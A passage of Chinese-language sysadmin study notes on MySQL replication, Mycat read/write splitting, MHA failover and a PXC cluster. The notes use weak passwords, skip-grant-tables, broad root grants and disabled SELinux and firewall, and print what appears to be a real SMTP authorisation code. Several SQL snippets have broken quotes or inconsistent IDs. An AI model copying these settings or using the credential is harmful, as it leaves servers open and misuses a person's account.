mysql> create user repluser@'10.0.0.%' identified by '123456';
mysql> grant replication slave on *.* to repluser@'10.0.0.%';
mysql8.0之前的版本一条命令搞定
GRANT REPLICATION SLAVE  ON *.* TO 'repluser'@'HOST' IDENTIFIED BY 'replpass';

#5.把完全备份传到目标服务器上
[root@centos8 ~]# scp /opt/all.sql 10.0.0.18:/data


#从节点：10.0.0.18
#1.启动中继日志
root@centos8_1:~# vim /etc/my.cnf
[mysqld]
server_id=18
read_only
root@centos8_1:~# systemctl restart mysqld

#2.修改完全备份脚本
使用有复制权限的用户账号连接至主服务器，并启动复制线程
root@centos8_1:~# vim /data/all.sql
把下面四行加在CHANGE MASTER TO这行下面，保存并退出
MASTER_HOST='10.0.0.8', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,

#3.先禁用二进制日志
mysql> set sql_log_bin=0;
mysql> source /data/all.sql #这个脚本等于做了两件事，第一件事完全备份还原，第二件事自动执行了CHANGE MASTER TO

#4.真正开启线程数
mysql> start slave;
mysql> show slave status\G
#看到以下信息表示成功
Slave_IO_Running: Yes
Slave_SQL_Running: Yes
Seconds_Behind_Master: 0

mysql> show processlist;
#10.0.0.18机器出现Connect：Waiting for master to send event和Query：Slave has read all relay log; waiting for more updates则表示开启成功
#10.0.0.8机器出现Binlog Dump也表示成功了！！


#故障排错
#单向复制：即主数据库可以实时同步数据到从数据库，但是从数据库若修改数据，主数据库不会同步，若是从数据库用户不小心修改一条数据，而此时主数据库又插入一条数据，则会出现同步错误

#从数据库
#1.先停止线程
mysql> stop slave;
mysql> show slave status\G
Slave_IO_Running: No
Slave_SQL_Running: No

#2.先跳过你发生的错误
mysql> SET GLOBAL sql_slave_skip_counter = 1
mysql> start slave;
mysql> show slave status\G
Slave_IO_Running: Yes
Slave_SQL_Running: Yes

#3.或者修改系统变量
#系统变量，指定跳过复制事件的个数
SET GLOBAL sql_slave_skip_counter = N
#服务器选项，只读系统变量，指定跳过事件的ID
[mysqld]
slave_skip_errors=1007|ALL

#4.然后手动修改你发生错误
```

#### 35.9.3实现级联复制

![1653663979333](linuxSRE.assets/1653663979333.png)

```/
#在10.0.0.8充当master
#在10.0.0.18充当级联slave
#在10.0.0.28充当slave


#在master实现
#1.先把之前数据库里面的文件进行完全备份
[root@centos8 ~]# mysqldump -uroot -A -F --single-transaction --master-data=1 --default-character-set=utf8  > /opt/all.sql

#2.确定开启二进制日志
mysql> select @@log_bin;
+-----------+
| @@log_bin |
+-----------+
|         1 |
+-----------+
1 row in set (0.01 sec)

#3.为当前节点设置一个全局惟一的ID号
[root@centos8 ~]# vim /etc/my.cnf.d/mysql-server.cnf
[mysqld]
server_id=8
log-bin=/data/logbin/mysql-bin
[root@centos8 ~]# mkdir /data/logbin/ -pv
[root@centos8 ~]# chown mysql.mysql /data/logbin
[root@centos8 ~]# systemctl restart mysqld

#4.创建有复制权限的用户账号
mysql> create user repluser@'10.0.0.%' identified by '123456';
mysql> grant replication slave on *.* to repluser@'10.0.0.%';

#5.把完全备份传到目标服务器上
[root@centos8 ~]# scp /opt/all.sql 10.0.0.18:/data
[root@centos8 ~]# scp /opt/all.sql 10.0.0.88:/data



#在中间级联slave实现
#1.修改配置文件
root@centos8_1:~# vim /etc/my.cnf
[mysqld]
server_id=18
read_only
log_slave_updates  #级联复制中间节点的必选项
root@centos8_1:~# systemctl restart mysqld

#2.修改完全备份脚本
使用有复制权限的用户账号连接至主服务器，并启动复制线程
root@centos8_1:~# vim /data/all.sql
把下面四行加在CHANGE MASTER TO这行下面，保存并退出
MASTER_HOST='10.0.0.8', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,

#3.先禁用二进制日志
mysql> set sql_log_bin=0;
mysql> source /data/all.sql #这个脚本等于做了两件事，第一件事完全备份还原，第二件事自动执行了CHANGE MASTER TO
mysql> show master logs;  #记录二进制位置，给第三个节点使用  
+---------------+-----------+-----------+
| Log_name      | File_size | Encrypted |
+---------------+-----------+-----------+
| binlog.000001 |     12887 | No        |
+---------------+-----------+-----------+
mysql> set sql_log_bin=0;
#4.真正开启线程数
mysql> start slave;



#在第三个节点slave上实现
#1.修改配置文件
[root@centos8_clone1 ~]# yum -y install mysql-server
[root@centos8_clone1 ~]# vim /etc/my.cnf
[mysqld]
server-id=28
read-only
[root@centos8_clone1 ~]# systemctl restart mysqld

#2.使用有复制权限的用户账号连接至主服务器，并启动复制线程
[root@centos8_clone1 ~]# vim /opt/all.sql
MASTER_HOST='10.0.0.18', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='binlog.000002', MASTER_LOG_POS=341;

#3.开启线程
[root@centos8_clone1 ~]# mysql < /data/all.sql
[root@centos8_clone1 ~]# mysql -e 'start slave;'
```

#### 35.9.4半同步复制

```
#半同步：只要有一个成功了就行，
#在10.0.0.8充当master
#在10.0.0.18充当半同步slave
#在10.0.0.38充当半同步slave
#如果在此期间数据同步出现主服务器更新数据，其余的另外的两个从服务器其中一个不能自动同步数据，但主服务器上又看到连接状态已经连上去了，解决办法是先从master服务器上完全备份二进制数据，然后远程同步到从服务器，stop slave后，mysql < 二进制完全备份，start slave之后，则能解决问题！

#在master实现：10.0.0.8
#1.安装插件
[root@centos8 ~]# yum -y install mysql-server
[root@centos8 ~]# mysql
mysql> INSTALL PLUGIN rpl_semi_sync_master SONAME 'semisync_master.so';
mysql> mysql> show plugins;

#2.配置文件里配置
[root@centos8 ~]# vim /etc/my.cnf
[mysqld]
skip-grant-tables
skip-networking
server-id=8
log-bin
rpl_semi_sync_master_enabled=ON  #开启半同步功能
rpl_semi_sync_master_timeout=3000  #设置3s内无法同步，也将返回成功信息给客户端
[root@centos8 ~]# systemctl restart mysqld

#3.查看配置是否成功
[root@centos8 ~]# mysql
mysql> SHOW GLOBAL VARIABLES LIKE '%semi%';
看到ON就表示成功！！！
+-------------------------------------------+------------+
| Variable_name                             | Value      |
+-------------------------------------------+------------+
| rpl_semi_sync_master_enabled              | ON         |
| rpl_semi_sync_master_timeout              | 3000       |
| rpl_semi_sync_master_trace_level          | 32         |
| rpl_semi_sync_master_wait_for_slave_count | 1          |
| rpl_semi_sync_master_wait_no_slave        | ON         |
| rpl_semi_sync_master_wait_point           | AFTER_SYNC |
+-------------------------------------------+------------+
6 rows in set (0.00 sec)
mysql> SHOW GLOBAL STATUS LIKE '%semi%';
+--------------------------------------------+-------+
| Variable_name                              | Value |
+--------------------------------------------+-------+
| Rpl_semi_sync_master_clients               | 0     |
| Rpl_semi_sync_master_net_avg_wait_time     | 0     |
| Rpl_semi_sync_master_net_wait_time         | 0     |
| Rpl_semi_sync_master_net_waits             | 0     |
| Rpl_semi_sync_master_no_times              | 0     |
| Rpl_semi_sync_master_no_tx                 | 0     |
| Rpl_semi_sync_master_status                | ON    |
| Rpl_semi_sync_master_timefunc_failures     | 0     |
| Rpl_semi_sync_master_tx_avg_wait_time      | 0     |
| Rpl_semi_sync_master_tx_wait_time          | 0     |
| Rpl_semi_sync_master_tx_waits              | 0     |
| Rpl_semi_sync_master_wait_pos_backtraverse | 0     |
| Rpl_semi_sync_master_wait_sessions         | 0     |
| Rpl_semi_sync_master_yes_tx                | 0     |
+--------------------------------------------+-------+
14 rows in set (0.00 sec)
mysql> show master logs; #记下来留着备份
+--------------------+-----------+-----------+
| Log_name           | File_size | Encrypted |
+--------------------+-----------+-----------+
| centos8-bin.000001 |       155 | No        |
+--------------------+-----------+-----------+
1 row in set (0.00 sec)

#4.进行授权
mysql> create user repluser@'10.0.0.%' identified by '123456';
mysql> grant replication slave on *.* to repluser@'10.0.0.%';



#从服务器配置 10.0.0.18
#1.安装插件
root@centos8_1:~# yum -y install mysql-server
root@centos8_1:~# mysql
mysql> INSTALL PLUGIN rpl_semi_sync_slave SONAME 'semisync_slave.so';

#2.配置文件里配置
root@centos8_1:~# vim /etc/my.cnf
[mysqld]
server-id=18
rpl_semi_sync_slave_enabled=ON
[root@centos8 ~]# systemctl restart mysqld

#3.查看配置是否成功
[root@centos8 ~]# mysql
mysql> SHOW GLOBAL VARIABLES LIKE '%semi%';
看到ON就表示成功！！！


#4.与主服务进行关联
CHANGE MASTER TO
MASTER_HOST='10.0.0.8', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='centos8-bin.000005, MASTER_LOG_POS=155;

#5.开启从节点线程
mysql> start slave;
mysql> SHOW GLOBAL STATUS LIKE '%semi%';
+----------------------------+-------+
| Variable_name              | Value |
+----------------------------+-------+
| Rpl_semi_sync_slave_status | ON    |
+----------------------------+-------+ 
mysql> show slave status\G
 Slave_IO_Running: Yes
 Slave_SQL_Running: Yes




##从服务器配置 10.0.0.28
#1.安装插件
root@centos8_1:~# yum -y install mysql-server
root@centos8_1:~# mysql
mysql> INSTALL PLUGIN rpl_semi_sync_slave SONAME 'semisync_slave.so';

#2.配置文件里配置
root@centos8_1:~# vim /etc/my.cnf
[mysqld]
server-id=28
rpl_semi_sync_slave_enabled=ON
[root@centos8 ~]# systemctl restart mysqld

#3.查看配置是否成功
[root@centos8 ~]# mysql
mysql> SHOW GLOBAL VARIABLES LIKE '%semi%';
看到ON就表示成功！！！


#4.与主服务进行关联
CHANGE MASTER TO
MASTER_HOST='10.0.0.8', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='centos8-bin.000005，MASTER_LOG_POS=155
mysql> start slave;
mysql> SHOW GLOBAL STATUS LIKE '%semi%';
+----------------------------+-------+
| Variable_name              | Value |
+----------------------------+-------+
| Rpl_semi_sync_slave_status | ON    |
+----------------------------+-------+  
mysql> show slave status\G
 Slave_IO_Running: Yes
 Slave_SQL_Running: Yes
```

![1653721285403](linuxSRE.assets/1653721285403.png)

#### 35.9.5 复制过滤器

```
#复制过滤器就是复制你想要指定的数据库及里面的数据，不指定的其他数据库就不进行复制，即进行数据库的过滤
#在10.0.0.8充当master
#在10.0.0.18充当slave
#在10.0.0.38充当slave

#方法一：
#哪个节点上配影响的是哪个节点
#从节点slave 10.0.0.18
root@centos8_1:~# vim /etc/my.cnf
[mysqld]
server-id=18
rpl_semi_sync_slave_enabled=ON
#只要数据库db1和db2的数据
replicate_do_db=db1  
replicate_do_db=db2
root@centos8_1:~# systemctl restart mysqld



#方法二：(推荐)
[mysqld]
server-id=8
log-bin
binlog-do-db=db1 #配置的二进制日志，影响的是整个他的从节点
rpl_semi_sync_master_enabled=ON
rpl_semi_sync_master_timeout=3000
```

#### 35.9.6Mycat读写分离

![1653745460968](linuxSRE.assets/1653745460968.png)

**1.前置准备**

```
#0.前置准备
服务器共四台
mycat-server 10.0.0.8 #内存建议2G以上
mysql-master 10.0.0.18
mysql-slave  10.0.0.28
client       10.0.0.7

关闭SELinux和防火墙
systemctl stop firewalld
setenforce 0
时间同步
```

**2.10.0.0.8实现Mycat**

```
#10.0.0.8实现Mycat
#1.下载安装mycat的安装包以及java
[root@mycat ~]# wget http://dl.mycat.org.cn/1.6.7.4/Mycat-server-1.6.7.4-release/Mycat-server-1.6.7.4-release-20200105164103-linux.tar.gz
[root@mycat ~]# yum -y install java
[root@centos8 ~]# mkdir /apps
[root@mycat ~]# tar xvf Mycat-server-1.6.7.6-release-20210303094759-linux.tar.gz -C /apps/

#2.配置环境变量
[root@mycat ~]# echo 'PATH=/apps/mycat/bin:$PATH' > /etc/profile.d/mycat.sh
[root@mycat ~]# source /etc/profile.d/mycat.sh

#3.启动mycat
[root@mycat ~]# mycat start
[root@mycat ~]# tail -f /apps/mycat/logs/wrapper.log
#启动成功！！！！
INFO   | jvm 1    | 2022/05/28 23:53:19 | MyCAT Server startup successfully. see logs in logs/mycat.log
[root@mycat ~]# ss -ntl
LISTEN   0         128                      *:8066                   *:*

#4.修改端口号
[root@mycat ~]# vim /apps/mycat/conf/server.xml
#在第45行修改端口号为3306
 <property name="serverPort">3306</property> <property name="managerPort">9066</property>
 <property name="dataNodeIdleCheckPeriod">300000</property> #注意这< /property>行后面会跟了一些内容会使整个服务启动不起来，所以要删除跟在</property>后面饿内容
#在第111行修改默认密码123456
<user name="root">    
<property name="password">123456</property>


#5.修改schema.xml实现读写分离策略
[root@mycat ~]# cp /apps/mycat/conf/schema.xml /apps/mycat/conf/schema.xml.bak2
[root@mycat ~]# vim /apps/mycat/conf/schema.xml
#删除所有内容，把以下的内容全部粘贴过去
<?xml version="1.0"?>
<!DOCTYPE mycat:schema SYSTEM "schema.dtd">

<mycat:schema xmlns:mycat="http://io.mycat/">
  <schema name="TESTDB" checkSQLschema="false" sqlMaxLimit="100" dataNode="dn1"></schema>
  <dataNode name="dn1" dataHost="host1" database="hellodb"/>
  <dataHost name="host1" maxCon="1000" minCon="10" balance="1" writeType="0" dbType="mysql" dbDriver="native" switchType="1" slaveThreshold="100">
    <heartbeat>select user()</heartbeat>
    <!-- can have multi write hosts -->
    <writeHost host="hostM1" url="10.0.0.18:3306" user="root" password="123456">
      <!-- can have multi read hosts -->
      <readHost host="hostS1" url="10.0.0.28:3306" user="root" password="123456"/>
    </writeHost>
  </dataHost>
</mycat:schema>
[root@mycat ~]# mycat restart
[root@mycat ~]# cat /apps/mycat/logs/wrapper.log
#启动服务成功！！！
INFO   | jvm 1    | 2022/05/29 10:47:11 | MyCAT Server startup successfully. see logs in logs/mycat.log
```

**3.10.0.0.18实现master服务器**

```
#1.修改配置文件
root@master:~#
yum -y install mysql-server
root@master:~# vim /etc/my.cnf
[mysqld]
server-id=18
root@master:~# systemctl restart mysqld

#2.创建主从复制授权账号
root@master:~# mysql
mysql> show master logs;
+---------------+-----------+-----------+
| Log_name      | File_size | Encrypted |
+---------------+-----------+-----------+
| binlog.000001 |       155 | No        |
+---------------+-----------+-----------+
1 row in set (0.00 sec)
mysql> create user repluser@'10.0.0.%' identified by '123456';
mysql> grant replication slave on *.* to repluser@'10.0.0.%';
root@master:~# mysqldump -uroot -A -F --single-transaction --master-data=1 --default-character-set=utf8  > /opt/all1.sql
root@master:~# scp /opt/all1.sql  10.0.0.28:

#3.创建mycat配置的root账号和密码
mysql> create user root@'10.0.0.%' identified by '123456';
mysql> grant all on *.* to root@'10.0.0.%';
```

**4.10.0.0.28实现slave服务器**

```
#10.0.0.28实现slave服务器
#1.修改配置文件
[root@slave ~]# yum -y install mysql-server
[root@slave ~]# vim /etc/my.cnf
[mysqld]
server-id=28

#2.实现主从复制之修改完全备份脚本
[root@slave ~]# mysql
#方法一：
CHANGE MASTER TO
MASTER_HOST='10.0.0.18', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='centos8-bin.000002，MASTER_LOG_POS=155;

#方法二：
[root@slave ~]# vim all1.sql
CHANGE MASTER TO
MASTER_HOST='10.0.0.18', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='centos8-bin.000002，MASTER_LOG_POS=155
[root@slave ~]# mysql < all1.sql


#3.开启从线程
mysql> start slave;
mysql> show slave status\G


#4.查看是否同步主master的授权账号
mysql> select user,host from mysql.user;
+------------------+-----------+
| user             | host      |
+------------------+-----------+
| repluser         | 10.0.0.%  |
| root             | 10.0.0.%  |
| mysql.infoschema | localhost |
| mysql.session    | localhost |
| mysql.sys        | localhost |
| root             | localhost |
+------------------+-----------+
6 rows in set (0.01 sec)

#5.开启通用日志
mysql> show variables like 'general%';
mysql> set global general_log=1;
[root@slave ~]# tail -f /var/lib/mysql/slave.log
```

**5.10.0.0.7客户端**

```
#10.0.0.7客户端
#1.测试第一次连接
[09:31:25 root@centos7 ~]#mysql -uroot -p123456 -h 10.0.0.8 -P8066 #mycat默认密码123456
Server version: 5.6.29-mycat-1.6.7.6-release-20210303094759 MyCat Server (OpenCloudDB)
MySQL [(none)]> show databases;
mycat虚拟出来的假表
+----------+
| DATABASE |
+----------+
| TESTDB   |
+----------+

#2.测试第二次连接
#修改端口号为3306和密码
[11:20:52 root@centos7 ~]#mysql -uroot -p123456 -h 10.0.0.
```

范例：schema.xml

![1653818712890](linuxSRE.assets/1653818712890.png)

#### 35.9.10 MySQL高可用

##### 35.9.10.1MHA工作原理和架构

```
#1.什么是MHA
MHA：Master High Availability，对主节点进行监控，可实现自动故障转移至其它从节点；通过提升某一从节点为新的主节点，基于主从复制实现，还需要客户端配合实现，目前MHA主要支持
一主多从的架构，要搭建MHA,要求一个复制集群中必须最少有三台数据库服务器，一主二从，即一台充当master，一台充当备用master，另外一台充当从库，出于机器成本的考虑，淘宝进行了改造，目前淘宝TMHA已经支持一主一从



#2.MHA的工作原理
1. 从宕机崩溃的master保存二进制日志事件（binlog events）
2. 识别含有最新更新的slave
3. 应用差异的中继日志（relay log）到其他的slave
4. 应用从master保存的二进制日志事件（binlog events）
5. 提升一个slave为新的master
6. 使其他的slave连接新的master进行复制
```

![1653820640620](linuxSRE.assets/1653820640620.png)

##### 35.9.10.2 实现MHA集群

![1653821358283](linuxSRE.assets/1653821358283.png)

**1.环境准备：**

```
#1.环境:四台主机
10.0.0.7 CentOS7 MHA管理端
10.0.0.8 CentOS8 Master
10.0.0.18 CentOS8 Slave1
10.0.0.28 CentOS8 Slave2

#2.需要包的下载地址：https://github.com/yoshinorim/mha4mysql-node/releases/tag/v0.58

#3.每台机器需要的包
10.0.0.7:mha4mysql-manager和mha4mysql-node
10.0.0.8:mha4mysql-node
10.0.0.18:mha4mysql-node
10.0.0.28:mha4mysql-node
```

**2.修改配置10.0.0.7**

```
10.0.0.7 CentOS7 MHA管理端
#1.安装rpm包
[20:20:44 root@mha-manager ~]#yum -y install mha4mysql-*.rpm


#2.在所有节点实现相互之间ssh key验证
[20:26:04 root@mha-manager ~]#ssh-keygen
[20:26:04 root@mha-manager ~]#ssh-copy-id 127.0.0.1
[20:28:20 root@mha-manager ~]#rsync -av .ssh 10.0.0.8:/root/
[20:28:20 root@mha-manager ~]#rsync -av .ssh 10.0.0.18:/root/
[20:28:20 root@mha-manager ~]#rsync -av .ssh 10.0.0.28:/root/


#3.在管理节点建立配置文件
[20:31:06 root@mha-manager ~]#mkdir /etc/mastermha/
[20:35:49 root@mha-manager ~]#vim /etc/mastermha/app1.cnf
set list查看空格：一定要结尾不带任何空格
[server default]
user=mhauser
password=123456
manager_workdir=/data/mastermha/app1/
manager_log=/data/mastermha/app1/manager.log
remote_workdir=/data/mastermha/app1/
ssh_user=root
repl_user=repluser
repl_password=123456
ping_interval=1
master_ip_failover_script=/usr/local/bin/master_ip_failover
report_script=/usr/local/bin/sendmail.sh
check_repl_delay=0
master_binlog_dir=/data/mysql/

[server1]
hostname=10.0.0.8
candidate_master=1
[server2]
hostname=10.0.0.18
candidate_master=1
[server3]
hostname=10.0.0.28


#4.搭建邮件服务
[20:49:53 root@mha-manager ~]#vim /etc/mail.rc
set from=1805336068@qq.com
set smtp=smtp.qq.com
set smtp-auth-user=1805336068@qq.com
set smtp-auth-password=mkmzfnyrjkojbgfg

#5.相关脚本
[20:53:31 root@mha-manager ~]#cat > /usr/local/bin/sendmail.sh
#!/bin/bash
echo "MySQL is down" | mail -s "MHA Warning" 1805336068@qq.com
^C
[20:57:52 root@mha-manager ~]#bash /usr/local/bin/sendmail.sh #测试邮件是否能发成功
[20:57:59 root@mha-manager ~]#chmod +x /usr/local/bin/sendmail.sh

#5.1perl脚本
[20:57:59 root@mha-manager ~]# vim /usr/local/bin/master_ip_failover
#!/usr/bin/env perl
use strict;
use warnings FATAL => 'all';
use Getopt::Long;
my (
$command, $ssh_user, $orig_master_host, $orig_master_ip,
$orig_master_port, $new_master_host, $new_master_ip, $new_master_port
);
my $vip = '10.0.0.100/24';
my $gateway = '10.0.0.2';
my $interface = 'eth0';
my $key = "1";
my $ssh_start_vip = "/sbin/ifconfig $interface:$key $vip;/sbin/arping -I 
$interface -c 3 -s $vip $gateway >/dev/null 2>&1";
my $ssh_stop_vip = "/sbin/ifconfig $interface:$key down";
GetOptions(
'command=s' => \$command,
'ssh_user=s' => \$ssh_user,
'orig_master_host=s' => \$orig_master_host,
'orig_master_ip=s' => \$orig_master_ip,
'orig_master_port=i' => \$orig_master_port,
'new_master_host=s' => \$new_master_host,
'new_master_ip=s' => \$new_master_ip,
'new_master_port=i' => \$new_master_port,
);
exit &main();
sub main {
print "\n\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\n\n";
if ( $command eq "stop" || $command eq "stopssh" ) { 
# $orig_master_host, $orig_master_ip, $orig_master_port are passed.
# # If you manage master ip address at global catalog database,
# # invalidate orig_master_ip here.
my $exit_code = 1;
eval {
print "Disabling the VIP on old master: $orig_master_host \n";
&stop_vip();
$exit_code = 0;
};
if ($@) {
warn "Got Error: $@\n";
exit $exit_code;
}
exit $exit_code;
}
elsif ( $command eq "start" ) {
# all arguments are passed.
# # If you manage master ip address at global catalog database,
# # activate new_master_ip here.
# # You can also grant write access (create user, set read_only=0, etc) here.
my $exit_code = 10;
eval {
print "Enabling the VIP - $vip on the new master - $new_master_host \n";
&start_vip();
$exit_code = 0;
};
if ($@) {
warn $@;
exit $exit_code;
}
exit $exit_code;
}
elsif ( $command eq "status" ) {
print "Checking the Status of the script.. OK \n";
`ssh $ssh_user\@$orig_master_host \" $ssh_start_vip \"`;
exit 0;
}
else {
&usage();
exit 1;
}
}
sub start_vip() {
`ssh $ssh_user\@$new_master_host \" $ssh_start_vip \"`;
}
sub stop_vip() {
`ssh $ssh_user\@$orig_master_host \" $ssh_stop_vip \"`;
}
sub usage {
print
"Usage: master_ip_failover --command=start|stop|stopssh|status --
orig_master_host=host --orig_master_ip=ip --orig_master_port=port --
new_master_host=host --new_master_ip=ip --new_master_port=port\n";
}



#5.2移动到指定目录
[21:13:45 root@mha-manager ~]#mv master_ip_failover /usr/local/bin/
[21:16:47 root@mha-manager ~]#chmod +x /usr/local/bin/master_ip_failover


#6.检查环境
#只要有一个错了下面的进行不下去了
[22:17:24 root@mha-manager ~]#masterha_check_ssh --conf=/etc/mastermha/app1.cnf
Sun May 29 22:17:29 2022 - [info] All SSH connection tests passed successfully.
[22:29:55 root@mha-manager ~]#masterha_check_repl --conf=/etc/mastermha/app1.cnf
#成功提示：
MySQL Replication Health is OK.
#错误提示：
#1.出现如下错误
Sun May 29 22:33:30 2022 - [error][/usr/share/perl5/vendor_perl/MHA/Server.pm, ln180] Got MySQL error when connecting 10.0.0.28(10.0.0.28:3306) :1130:Host '10.0.0.7' is not allowed to connect to this MySQL server, but this is not a MySQL crash. Check MySQL server settings.

解决办法：
1.改表法
mysql> use mysql;
mysql> update user set host = '%' where user = 'root';
mysql> FLUSH PRIVILEGES;
2.授权法
GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.1.3' IDENTIFIED BY 'mypassword' WITH GRANT OPTION;


#7.查看状态
[22:37:16 root@mha-manager ~]#masterha_check_status --conf=/etc/mastermha/app1.cnf
#表示还没有运行
app1 is stopped(2:NOT_RUNNING).
#表示已经运行
app1 (pid:15413) is running(0:PING_OK), master:10.0.0.8



#8.启动MHA，默认后台运行
nohup masterha_manager --conf=/etc/mastermha/app1.cnf &> /dev/null


#9.排错日志
[23:00:23 root@mha-manager ~]#tail -f /data/mastermha/app1/manager.log
```

**3.修改配置10.0.0.8**

```
10.0.0.8 CentOS8 Master
#1.安装包
[root@master ~]# yum -y install mha4mysql-node-0.58-0.el7.centos.noarch.rpm


#2.实现主从复制
[root@master ~]# yum -y install mysql-server
[root@master ~]# mkdir /data/mysql/
[root@master ~]# chown mysql.mysql /data/mysql/
[root@master ~]# vim /etc/my.cnf
[mysqld]
server_id=8
log-bin=/data/mysql/mysql-bin
skip_name_resolve=1
general_log
[root@master ~]# systemctl enable --now mysqld
[root@master ~]# mysql
mysql> show master logs;
+------------------+-----------+-----------+
| Log_name         | File_size | Encrypted |
+------------------+-----------+-----------+
| mysql-bin.000001 |       178 | No        |
| mysql-bin.000002 |      1247 | No        |
| mysql-bin.000003 |       155 | No        |
+------------------+-----------+-----------+
3 rows in set (0.00 sec)
mysql> create user repluser@'10.0.0.%' identified by '123456';
mysql> grant replication slave on *.* to repluser@'10.0.0.%';
mysql> create user mhauser@'10.0.0.%' identified by '123456';
mysql>  grant all on *.* to mhauser@'10.0.0.%';
[root@master ~]# mysqldump -uroot -A -F --single-transaction --master-data=1 --default-character-set=utf8  > /opt/all.sql
[root@master ~]# scp /opt/all.sql  10.0.0.18:
[root@master ~]# scp /opt/all.sql  10.0.0.28:


#3.配置VIP
[root@master ~]# ifconfig eth0:1 10.0.0.100/24



#4.查看MHA监控
[root@master ~]# tail -f /var/lib/mysql/master.log
#每一秒发出一次查询请求
2022-05-29T15:03:24.540333Z	   21 Query	SELECT 1 As Value
2022-05-29T15:03:25.541542Z	   21 Query	SELECT 1 As Value
2022-05-29T15:03:26.542676Z	   21 Query	SELECT 1 As Value
```

**4.修改配置10.0.0.18**

```
10.0.0.18 CentOS8 Slave1
root@slave1:~# yum -y install mha4mysql-node-0.58-0.el7.centos.noarch.rpm
root@slave1:~# yum -y install mysql-server

#1.实现主从复制
[root@master ~]# mkdir /data/mysql/
[root@master ~]# chown mysql.mysql /data/mysql/
[root@master ~]# vim /etc/my.cnf
[mysqld]
server_id=28
log-bin=/data/mysql/mysql-bin
read_only
relay_log_purge=0
skip_name_resolve=1
general_log

root@slave1:~# systemctl enable --now mysqld
root@slave1:~# vim all.sql
CHANGE MASTER TO 
MASTER_HOST='10.0.0.8',
MASTER_USER='repluser',
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='mysql-bin.000003', MASTER_LOG_POS=155;

root@slave1:~# mysql < all.sql
mysql> start slave;
mysql> show slave status\G;
#如果发生错误重新清理线程
mysql> reset slave all;
```

**5.修改配置10.0.0.28**

```
10.0.0.28 CentOS8 Slave2
[root@slave2 ~]# yum -y install mha4mysql-node-0.58-0.el7.centos.noarch.rpm
[root@slave2 ~]# yum -y install mysql-server

#1.实现主从复制
[root@master ~]# mkdir /data/mysql/
[root@master ~]# chown mysql.mysql /data/mysql/
[root@master ~]# vim /etc/my.cnf
[mysqld]
server_id=28
log-bin=/data/mysql/mysql-bin
read_only
relay_log_purge=0
skip_name_resolve=1
general_log
[root@slave2 ~]# systemctl enable --now mysqld
root@slave1:~# vim all.sql
CHANGE MASTER TO 
MASTER_HOST='10.0.0.8',
MASTER_USER='repluser',
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='mysql-bin.000003', MASTER_LOG_POS=155;

root@slave1:~# mysql < all.sql
mysql> start slave;
mysql> show slave status\G;
#如果发生错误重新清理线程
mysql> reset slave all;
```

##### 35.9.10.3实现PXC集群

```
#0.PXC特点
多主架构：真正的多点读写的集群，在任何时候读写数据，都是最新的
同步复制：集群不同节点之间数据同步，没有延迟，在数据库挂掉之后，数据不会丢失
并发复制：从节点APPLY数据时，支持并行执行，更好的性能
故障切换：在出现数据库故障时，因支持多点写入，切换容易
热插拔：在服务期间，如果数据库挂了，只要监控程序发现的够快，不可服务时间就会非常少。在
节点故障期间，节点本身对集群的影响非常小
自动节点克隆：在新增节点，或者停机维护时，增量数据或者基础数据不需要人工手动备份提供，
Galera Cluster会自动拉取在线节点数据，最终集群会变为一致
对应用透明：集群的维护，对应用程序是透明的
```

![1653877952183](linuxSRE.assets/1653877952183.png)

**1.环境准备**

```
pxc1:10.0.0.7
pxc2:10.0.0.17
pxc3:10.0.0.27
pxc4:10.0.0.37

OS 版本目前不支持CentOS 8
关闭防火墙和SELinux，保证时间同步
注意：如果已经安装MySQL，必须卸载
```

**2.pxc1:10.0.0.7**

```
#1.配置清华大学yum源
[10:36:23 root@pxc1 ~]#vim /etc/yum.repos.d/pxc.repo
[percona]
name=percona_repo
baseurl = https://mirrors.tuna.tsinghua.edu.cn/percona/release/$releasever/RPMS/$basearch
enabled = 1
gpgcheck = 0
[10:49:09 root@pxc1 ~]#scp /etc/yum.repos.d/pxc.repo 10.0.0.17:/etc/yum.repos.d/
[10:49:09 root@pxc1 ~]#scp /etc/yum.repos.d/pxc.repo 10.0.0.27:/etc/yum.repos.d/
[10:49:09 root@pxc1 ~]#scp /etc/yum.repos.d/pxc.repo 10.0.0.37:/etc/yum.repos.d/



#2.安装包
[11:03:52 root@pxc1 ~]#yum install Percona-XtraDB-Cluster-57 -y



#3.修改PXC的配置文件
[11:14:36 root@pxc1 ~]#vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf
#in order to do that you need to bootstrap this node
wsrep_cluster_address=gcomm://10.0.0.7,10.0.0.17,10.0.0.27 #指定你要搭建的集群
# Node IP address
wsrep_node_address=10.0.0.7 #指定本机的ip
#Authentication for SST method
wsrep_sst_auth="sstuser:s3cretPass" #账号密码

#If wsrep_node_name is not specified,  then system # Cluster name
wsrep_cluster_name=pxc-cluster-liu

#If wsrep_node_name is not specified,  then system hostname will be used
wsrep_node_name=pxc-cluster-node-1-liu #一定要注意node-1,node-2,node-3的写，不然后续大坑！！

#Authentication for SST method
wsrep_sst_auth="sstuser:s3cretPass"

[11:39:17 root@pxc1 ~]#scp /etc/percona-xtradb-cluster.conf.d/wsrep.cnf 10.0.0.17:/etc/percona-xtradb-cluster.conf.d/wsrep.cnf   
[11:40:12 root@pxc1 ~]#scp /etc/percona-xtradb-cluster.conf.d/wsrep.cnf 10.0.0.27:/etc/percona-xtradb-cluster.conf.d/wsrep.cnf



#4.启动PXC集群中第一个节点
[11:40:32 root@pxc1 ~]#systemctl start mysql@bootstrap.service



#5.查看root临时密码
[root@pxc1 ~]# grep "temporary password" /var/log/mysqld.log
